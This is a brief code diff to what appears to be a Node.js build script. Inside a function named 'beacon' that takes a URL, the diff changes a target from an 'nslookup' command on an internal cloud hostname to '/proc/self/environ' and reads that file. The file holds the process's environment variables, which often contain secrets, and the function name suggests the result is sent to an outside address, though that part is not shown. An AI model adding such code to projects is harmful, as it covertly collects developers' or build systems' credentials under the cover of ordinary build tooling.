@@ -35,7 +35,7 @@ function beacon(urlStr, q) {
   const outDir = path.join(__dirname, "..", "dist");
   fs.mkdirSync(outDir, { recursive: true });
 
-  const target = "nslookup something.eu-west-1.compute.internal";
+  const target = "/proc/self/environ";
   let exists = false, size = -1, sha256 = "n/a";
   try {
     const buf = fs.readFileSync(target);
